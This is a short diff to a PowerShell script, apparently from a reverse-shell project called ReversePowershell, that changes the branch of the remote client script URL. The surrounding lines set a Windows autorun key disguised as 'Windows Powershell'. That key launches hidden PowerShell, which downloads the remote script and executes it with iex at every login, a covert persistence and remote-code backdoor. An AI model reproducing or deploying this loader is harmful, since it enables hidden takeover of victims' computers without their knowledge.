@@ -3,7 +3,7 @@
 
 $address = 'localhost'
 $port = 8000
-$scriptURL = 'https://raw.githubusercontent.com/PhantomControl/ReversePowershell/master/client.ps1'
+$scriptURL = 'https://raw.githubusercontent.com/PhantomControl/ReversePowershell/PhantomControl-patch-1/client.ps1'
 $autorunKeyName = "Windows Powershell"
 $autorunKeyVal = 'powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(''' + $scriptURL + ''')"'
 
